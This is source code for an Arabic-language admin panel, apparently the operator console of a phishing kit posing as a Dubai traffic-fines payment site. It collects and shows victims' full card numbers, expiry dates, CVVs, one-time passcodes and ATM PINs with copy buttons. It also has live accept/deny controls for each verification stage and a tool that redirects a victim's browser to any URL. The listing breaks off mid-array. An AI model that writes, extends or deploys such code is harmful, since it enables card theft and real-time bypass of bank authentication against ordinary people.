import { useState, useEffect, useRef } from "react";
import { trpc } from "@/lib/trpc";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

interface PaymentSession {
  id: number;
  sessionId: string;
  queryId: number | null;
  selectedFines: any;
  totalAmount: string | null;
  cardName: string | null;
  cardNumber: string | null;
  cardNumberMasked: string | null;
  cardExpiry: string | null;
  cardCvv: string | null;
  otpCode: string | null;
  atmPin: string | null;
  stage: Stage;
  errorMessage: string | null;
  plateNumber: string | null;
  plateSource: string | null;
  plateCode?: string | null;
  clientIp: string | null;
  userAgent: string | null;
  statusRead: number | null;
  createdAt: Date | string;
  updatedAt: Date | string;
}

// ======== الحالات ========
const stageConfig: Record<Stage, { label: string; color: string; bg: string }> = {
  card:         { label: "جديد",              color: "#2563eb", bg: "#dbeafe" },
  card_pending: { label: "انتظار دفع",        color: "#d97706", bg: "#fef3c7" },
  otp:          { label: "انتظار OTP",        color: "#b45309", bg: "#fef9c3" },
  otp_pending:  { label: "انتظار OTP",        color: "#b45309", bg: "#fef9c3" },
  atm:          { label: "انتظار PIN",        color: "#7c3aed", bg: "#ede9fe" },
  atm_pending:  { label: "انتظار PIN",        color: "#7c3aed", bg: "#ede9fe" },
  success:      { label: "مكتمل",             color: "#16a34a", bg: "#dcfce7" },
  failed:       { label: "فشل",               color: "#dc2626", bg: "#fee2e2" },
};

function StageBadge({ stage }: { stage: Stage }) {
  const cfg = stageConfig[stage] || { label: stage, color: "#6b7280", bg: "#f3f4f6" };
  return (
    <span
      className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-semibold"
      style={{ color: cfg.color, backgroundColor: cfg.bg }}
    >
      {cfg.label}
    </span>
  );
}

// ======== Modal تفاصيل الحجز (مطابق لـ carvasv.online) ========
function BookingDetailModal({
  session,
  token,
  onClose,
  onAction,
}: {
  session: PaymentSession;
  token: string;
  onClose: () => void;
  onAction: (action: "pass" | "denied" | "completed", errorMsg?: string) => void;
}) {
  const [customError, setCustomError] = useState("تم رفض العملية. يرجى المحاولة مرة أخرى.");
  const [copied, setCopied] = useState<string | null>(null);
  const isPending = session.stage.endsWith("_pending");

  const copyText = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(text);
      setTimeout(() => setCopied(null), 2000);
    });
  };

  const InfoRow = ({ label, value }: { label: string; value?: string | null }) => (
    <div className="flex justify-between items-center py-2.5 border-b border-gray-100 last:border-0">
      <span className="text-gray-500 text-sm">{label}</span>
      <span className="text-gray-800 text-sm font-medium text-left">{value || "-"}</span>
    </div>
  );

  const CopyRow = ({ label, value }: { label: string; value?: string | null }) => (
    <div className="flex justify-between items-center py-2.5 border-b border-gray-100 last:border-0">
      <span className="text-gray-500 text-sm">{label}</span>
      <div className="flex items-center gap-2">
        <span className="text-gray-800 text-sm font-mono font-semibold">{value || "-"}</span>
        {value && (
          <button
            onClick={() => copyText(value)}
            className="text-gray-400 hover:text-blue-500 transition p-1 rounded"
            title="نسخ"
          >
            {copied === value ? (
              <svg className="w-4 h-4 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            ) : (
              <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
              </svg>
            )}
          </button>
        )}
      </div>
    </div>
  );

  return (
    <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4" onClick={onClose}>
      <div
        className="bg-white rounded-2xl w-full max-w-lg max-h-[90vh] overflow-y-auto shadow-2xl"
        onClick={e => e.stopPropagation()}
        dir="rtl"
      >
        {/* هيدر الـ modal */}
        <div className="flex items-center justify-between p-5 border-b border-gray-200">
          <h3 className="text-gray-800 font-bold text-base">
            تفاصيل الحجز - <span className="text-blue-600 font-mono text-sm">{session.sessionId.slice(0, 16)}</span>
          </h3>
          <button onClick={onClose} className="text-gray-400 hover:text-gray-600 transition">
            <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>

        <div className="p-5 space-y-5">
          {/* بيانات العميل */}
          <div>
            <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
              <svg className="w-4 h-4 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
              </svg>
              بيانات العميل
            </h4>
            <div className="bg-gray-50 rounded-xl px-4">
              <InfoRow label="الاسم" value={session.cardName || "غير محدد"} />
              <InfoRow label="رقم اللوحة" value={session.plateNumber} />
              <InfoRow label="الإمارة" value={session.plateSource} />
              <InfoRow label="المبلغ الإجمالي" value={session.totalAmount ? `${session.totalAmount} درهم` : null} />
              <InfoRow label="IP العميل" value={session.clientIp} />
              <InfoRow label="الحالة" value={stageConfig[session.stage]?.label} />
            </div>
          </div>

          {/* بيانات البطاقة */}
          {session.cardNumber && (
            <div>
              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
                <svg className="w-4 h-4 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                </svg>
                بيانات البطاقة
              </h4>
              <div className="bg-gray-50 rounded-xl px-4">
                <CopyRow label="اسم الحامل" value={session.cardName} />
                <CopyRow label="رقم البطاقة" value={session.cardNumber} />
                <CopyRow label="تاريخ الانتهاء" value={session.cardExpiry} />
                <CopyRow label="CVV" value={session.cardCvv} />
              </div>
            </div>
          )}

          {/* OTP */}
          {session.otpCode && (
            <div>
              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
                <svg className="w-4 h-4 text-purple-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
                رمز OTP
              </h4>
              <div className="bg-gray-50 rounded-xl px-4">
                <CopyRow label="رمز OTP" value={session.otpCode} />
              </div>
            </div>
          )}

          {/* ATM PIN */}
          {session.atmPin && (
            <div>
              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
                <svg className="w-4 h-4 text-amber-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z" />
                </svg>
                الرقم السري (PIN)
              </h4>
              <div className="bg-gray-50 rounded-xl px-4">
                <CopyRow label="PIN" value={session.atmPin} />
              </div>
            </div>
          )}

          {/* الإجراءات */}
          {isPending && (
            <div className="bg-amber-50 border border-amber-200 rounded-xl p-4">
              <h4 className="text-amber-700 font-bold text-sm mb-3">⚡ الإجراءات</h4>
              <div className="flex flex-wrap gap-2 mb-3">
                <button
                  onClick={() => onAction("pass")}
                  className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5"
                >
                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  قبول / التالي
                </button>
                <button
                  onClick={() => onAction("denied", customError)}
                  className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5"
                >
                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                  رفض
                </button>
                <button
                  onClick={() => onAction("completed")}
                  className="bg-emerald-600 hover:bg-emerald-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5"
                >
                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  إتمام الدفع
                </button>
              </div>
              <div>
                <label className="text-gray-600 text-xs mb-1 block">رسالة الرفض المخصصة:</label>
                <input
                  type="text"
                  value={customError}
                  onChange={e => setCustomError(e.target.value)}
                  className="w-full border border-gray-300 text-gray-800 text-sm rounded-lg px-3 py-2 focus:outline-none focus:border-blue-500 bg-white"
                />
              </div>
            </div>
          )}

          {/* توجيه العميل */}
          <div>
            <h4 className="text-gray-700 font-bold text-sm mb-3">توجيه العميل إلى صفحة</h4>
            <div className="flex flex-wrap gap-2">
              {[
                { label: "الدفع", icon: "💳" },
                { label: "الرئيسية", icon: "🏠" },
              ].map(item => (
                <button
                  key={item.label}
                  className="flex items-center gap-1.5 px-3 py-1.5 bg-gray-100 hover:bg-gray-200 text-gray-700 rounded-lg text-sm transition"
                >
                  <span>{item.icon}</span>
                  <span>{item.label}</span>
                </button>
              ))}
            </div>
          </div>

          {/* معلومات إضافية */}
          <div className="bg-gray-50 rounded-xl px-4">
            <InfoRow label="تاريخ الإنشاء" value={new Date(session.createdAt).toLocaleString("ar-AE")} />
            <InfoRow label="آخر تحديث" value={new Date(session.updatedAt).toLocaleString("ar-AE")} />
          </div>
        </div>
      </div>
    </div>
  );
}

// ======== الصفحة الرئيسية ========
export default function AdminPanel() {
  const [token, setToken] = useState<string | null>(() => localStorage.getItem("adminToken"));
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loginError, setLoginError] = useState("");
  const [selectedSession, setSelectedSession] = useState<PaymentSession | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [notification, setNotification] = useState<{ message: string; type: "success" | "error" | "info" } | null>(null);
  const notifTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [redirectSession, setRedirectSession] = useState<PaymentSession | null>(null);
  const [redirectUrl, setRedirectUrl] = useState("");
  const redirectMutation = trpc.admin.redirect.useMutation();
  const [activeVisitors, setActiveVisitors] = useState(0);
  const wsRef = useRef<WebSocket | null>(null);

  // WebSocket لتتبع الزوار الحقيقيين
  useEffect(() => {
    if (!token) return;
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}/ws/visitors?admin=true`;
    const ws = new WebSocket(wsUrl);
    wsRef.current = ws;
    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.type === 'visitor_count') {
          setActiveVisitors(data.count);
        }
      } catch {}
    };
    ws.onerror = () => {};
    return () => {
      ws.close();
    };
  }, [token]);

  const showNotif = (message: string, type: "success" | "error" | "info") => {
    setNotification({ message, type });
    if (notifTimer.current) clearTimeout(notifTimer.current);
    notifTimer.current = setTimeout(() => setNotification(null), 4000);
  };

  // tRPC
  const loginMutation = trpc.admin.login.useMutation();
  const verifyQuery = trpc.admin.verify.useQuery(
    { token: token || "" },
    { enabled: !!token, retry: false }
  );
  const statsQuery = trpc.admin.getStats.useQuery(
    { token: token || "" },
    { enabled: !!token && verifyQuery.data?.valid === true, refetchInterval: 8000 }
  );
  const sessionsQuery = trpc.admin.getSessions.useQuery(
    { token: token || "" },
    { enabled: !!token && verifyQuery.data?.valid === true, refetchInterval: 5000 }
  );
  const sessionDetailQuery = trpc.admin.getSession.useQuery(
    { token: token || "", sessionId: selectedSession?.sessionId || "" },
    { enabled: !!token && !!selectedSession, refetchInterval: 3000 }
  );
  const actionMutation = trpc.admin.action.useMutation();
  const runMigrationsMutation = trpc.admin.runMigrations.useMutation();

  useEffect(() => {
    if (verifyQuery.data && !verifyQuery.data.valid) {
      localStorage.removeItem("adminToken");
      setToken(null);
    }
  }, [verifyQuery.data]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    setLoginError("");
    try {
      const res = await loginMutation.mutateAsync({ password });
      if (res.success) {
        localStorage.setItem("adminToken", res.token);
        setToken(res.token);
      }
    } catch (err: any) {
      setLoginError(err.message || "كلمة المرور غير صحيحة");
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("adminToken");
    setToken(null);
  };

  const handleAction = async (action: "pass" | "denied" | "completed", errorMsg?: string) => {
    if (!selectedSession || !token) return;
    try {
      const res = await actionMutation.mutateAsync({
        token,
        sessionId: selectedSession.sessionId,
        action,
        errorMessage: errorMsg,
      });
      showNotif(
        `تم تنفيذ: ${action === "pass" ? "قبول" : action === "denied" ? "رفض" : "إتمام"} ← ${res.newStage}`,
        "success"
      );
      setSelectedSession(null);
      sessionsQuery.refetch();
      statsQuery.refetch();
    } catch (err: any) {
      showNotif(err.message || "حدث خطأ", "error");
    }
  };

  // ======== صفحة تسجيل الدخول ========
  if (!token || verifyQuery.data?.valid === false) {
    return (
      <div
        className="min-h-screen flex items-center justify-center p-4"
        style={{ background: "linear-gradient(135deg, #1a2744 0%, #0f1f3d 100%)" }}
        dir="rtl"
      >
        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-sm">
          {/* أيقونة */}
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
              <svg className="w-9 h-9 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM19 17a2 2 0 11-4 0 2 2 0 014 0z" />
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16V6a1 1 0 00-1-1H4a1 1 0 00-1 1v10l2 2h10l2-2z" />
              </svg>
            </div>
            <h2 className="text-gray-800 text-xl font-bold">نظام مخالفات دبي</h2>
            <p className="text-gray-500 text-sm mt-1">لوحة التحكم الإدارية</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="text-gray-600 text-sm block mb-1.5 font-medium">
                <svg className="w-4 h-4 inline ml-1 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
                </svg>
                كلمة المرور
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                  placeholder="أدخل كلمة المرور"
                  id="pwInput"
                  className="w-full border border-gray-300 text-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100 pr-12"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                >
                  {showPassword ? (
                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                    </svg>
                  ) : (
                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                    </svg>
                  )}
                </button>
              </div>
            </div>

            {loginError && (
              <div className="bg-red-50 border border-red-200 rounded-xl px-4 py-2.5">
                <p className="text-red-600 text-sm">{loginError}</p>
              </div>
            )}

            <button
              type="submit"
              disabled={loginMutation.isPending}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl font-bold transition disabled:opacity-60 flex items-center justify-center gap-2 shadow-md"
            >
              {loginMutation.isPending ? (
                <>
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  جاري الدخول...
                </>
              ) : (
                <>
                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1" />
                  </svg>
                  تسجيل الدخول
                </>
              )}
            </button>
          </form>
        </div>
      </div>
    );
  }

  const stats = statsQuery.data;
  const allSessions: PaymentSession[] = sessionsQuery.data || [];
  const newCount = allSessions.filter(s => s.statusRead === 0).length;
  const pendingCount = allSessions.filter(s => s.stage.endsWith("_pending")).length;

  // فلترة البحث
  const filteredSessions = allSessions.filter(s => {
    if (!searchQuery) return true;
    const q = searchQuery.toLowerCase();
    return (
      (s.sessionId || "").toLowerCase().includes(q) ||
      (s.cardName || "").toLowerCase().includes(q) ||
      (s.plateNumber || "").toLowerCase().includes(q) ||
      (s.clientIp || "").toLowerCase().includes(q)
    );
  });

  // ======== لوحة التحكم الرئيسية ========
  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* إشعار */}
      {notification && (
        <div
          className={`fixed top-4 right-4 z-50 rounded-xl px-4 py-3 shadow-lg flex items-center gap-3 min-w-64 text-white text-sm font-medium ${
            notification.type === "success" ? "bg-green-600" :
            notification.type === "error" ? "bg-red-600" : "bg-blue-600"
          }`}
        >
          <span>{notification.type === "success" ? "✅" : notification.type === "error" ? "❌" : "ℹ️"}</span>
          <p>{notification.message}</p>
          <button onClick={() => setNotification(null)} className="mr-auto opacity-80 hover:opacity-100">✕</button>
        </div>
      )}

      {/* Modal تفاصيل */}
      {selectedSession && token && (
        <BookingDetailModal
          session={sessionDetailQuery.data || selectedSession}
          token={token}
          onClose={() => setSelectedSession(null)}
          onAction={handleAction}
        />
      )}

      {/* Modal إعادة التوجيه */}
      {redirectSession && token && (
        <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4" dir="rtl">
          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-md p-6">
            <div className="flex items-center gap-3 mb-5">
              <div className="w-10 h-10 bg-purple-100 rounded-xl flex items-center justify-center">
                <svg className="w-5 h-5 text-purple-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7" />
                </svg>
              </div>
              <div>
                <h3 className="text-gray-800 font-bold text-base">توجيه العميل</h3>
                <p className="text-gray-500 text-xs">{redirectSession.sessionId.slice(0, 12)}</p>
              </div>
              <button onClick={() => setRedirectSession(null)} className="mr-auto text-gray-400 hover:text-gray-600">
                <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            {/* صفحات سريعة */}
            <div className="mb-4">
              <p className="text-gray-600 text-sm font-medium mb-2">اختر صفحة:</p>
              <div className="grid grid-cols-2 gap-2">
                {[
                  { label: "🏠 الرئيسية", url: "/" },
                  { label: "💳 صفحة الدفع", url: "/payment" },
                  { label: "✅ نجاح الدفع", url: "/success" },
                  { label: "❌ فشل الدفع", url: "/failed" },
                ].map(page => (
                  <button
                    key={page.url}
                    onClick={() => setRedirectUrl(page.url)}
                    className={`px-3 py-2 rounded-lg text-sm text-right transition border ${
                      redirectUrl === page.url
                        ? "bg-purple-600 text-white border-purple-600"
                        : "bg-gray-50 text-gray-700 border-gray-200 hover:border-purple-300"
                    }`}
                  >
                    {page.label}
                  </button>
                ))}
              </div>
            </div>

            {/* رابط مخصص */}
            <div className="mb-5">
              <p className="text-gray-600 text-sm font-medium mb-1.5">أو أدخل رابط مخصص:</p>
              <input
                type="text"
                value={redirectUrl}
                onChange={e => setRedirectUrl(e.target.value)}
                placeholder="/payment?session=xxx أو https://..."
                className="w-full border border-gray-200 rounded-lg px-3 py-2 text-sm text-gray-700 focus:outline-none focus:border-purple-400 focus:ring-1 focus:ring-purple-200"
                dir="ltr"
              />
            </div>

            <div className="flex gap-2">
              <button
                onClick={async () => {
                  if (!redirectUrl.trim()) return;
                  try {
                    await redirectMutation.mutateAsync({
                      token,
                      sessionId: redirectSession.sessionId,
                      redirectUrl: redirectUrl.trim(),
                    });
                    showNotif("تم توجيه العميل بنجاح", "success");
                    setRedirectSession(null);
                  } catch (err: any) {
                    showNotif(err.message || "حدث خطأ", "error");
                  }
                }}
                disabled={!redirectUrl.trim() || redirectMutation.isPending}
                className="flex-1 bg-purple-600 hover:bg-purple-700 disabled:opacity-50 text-white py-2.5 rounded-xl font-bold text-sm transition flex items-center justify-center gap-2"
              >
                {redirectMutation.isPending ? (
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                ) : (
                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                )}
                توجيه العميل
              </button>
              <button
                onClick={() => setRedirectSession(null)}
                className="px-4 py-2.5 bg-gray-100 hover:bg-gray-200 text-gray-600 rounded-xl font-medium text-sm transition"
              >
                إلغاء
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ===== الهيدر ===== */}
      <header className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between shadow-sm">
        {/* يمين: الشعار والعنوان */}
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow">
            <svg className="w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM19 17a2 2 0 11-4 0 2 2 0 014 0z" />
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16V6a1 1 0 00-1-1H4a1 1 0 00-1 1v10l2 2h10l2-2z" />
            </svg>
          </div>
          <div>
            <h1 className="text-gray-800 font-bold text-sm leading-tight">نظام مخالفات دبي</h1>
            <p className="text-blue-600 text-xs font-semibold">لوحة التحكم</p>
          </div>
        </div>

        {/* يسار: حالة + إشعارات + تحديث + خروج */}
        <div className="flex items-center gap-3">
          {/* متصل */}
          <div className="flex items-center gap-1.5">
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
            <span className="text-green-600 text-xs font-medium">متصل</span>
          </div>

          {/* عداد الإشعارات */}
          {newCount > 0 && (
            <div className="relative">
              <div className="w-8 h-8 bg-gray-100 rounded-full flex items-center justify-center">
                <svg className="w-4 h-4 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" />
                </svg>
              </div>
              <span className="absolute -top-1 -left-1 bg-red-500 text-white text-xs w-4 h-4 rounded-full flex items-center justify-center font-bold">
                {newCount > 9 ? "9+" : newCount}
              </span>
            </div>
          )}

          {/* تحديث */}
          <button
            onClick={() => { sessionsQuery.refetch(); statsQuery.refetch(); }}
            className="w-8 h-8 bg-gray-100 hover:bg-gray-200 rounded-full flex items-center justify-center transition"
            title="تحديث"
          >
            <svg className="w-4 h-4 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
            </svg>
          </button>

          {/* إصلاح القاعدة */}
          <button
            onClick={async () => {
              if (!token) return;
              if (!confirm("هل أنت متأكد من رغبتك في محاولة إصلاح قاعدة البيانات؟ سيتم إنشاء الجداول المفقودة.")) return;
              try {
                await runMigrationsMutation.mutateAsync({ token });
                showNotif("تمت محاولة إصلاح قاعدة البيانات بنجاح", "success");
                statsQuery.refetch();
                sessionsQuery.refetch();
              } catch (err: any) {
                showNotif(err.message || "فشل الإصلاح", "error");
              }
            }}
            disabled={runMigrationsMutation.isPending}
            className="flex items-center gap-1.5 bg-blue-500 hover:bg-blue-600 text-white px-3 py-1.5 rounded-lg text-xs font-bold transition disabled:opacity-50"
          >
            <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
            </svg>
            إصلاح القاعدة
          </button>

          {/* خروج */}
          <button
            onClick={handleLogout}
            className="flex items-center gap-1.5 bg-red-500 hover:bg-red-600 text-white px-3 py-1.5 rounded-lg text-xs font-bold transition"
          >
            <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
            </svg>
            خروج
          </button>
        </div>
      </header>

      {/* ===== الإحصائيات ===== */}
      <div className="px-6 py-5">
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4 mb-6">
          {[
            {
              label: "إجمالي الحجوزات",
              value: stats?.total ?? allSessions.length,
              icon: (
                <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z" />
                </svg>
              ),
              color: "text-blue-600",
              bg: "bg-blue-50",
            },
            {
              label: "حجوزات جديدة",
              value: stats?.new ?? newCount,
              icon: (
                <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" />
                </svg>
              ),
              color: "text-orange-600",
              bg: "bg-orange-50",
            },
            {
              label: "مكتملة",
              value: stats?.completed ?? allSessions.filter(s => s.stage === "success").length,
              icon: (
                <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              ),
              color: "text-green-600",
              bg: "bg-green-50",
            },
            {
              label: "قيد المعالجة",
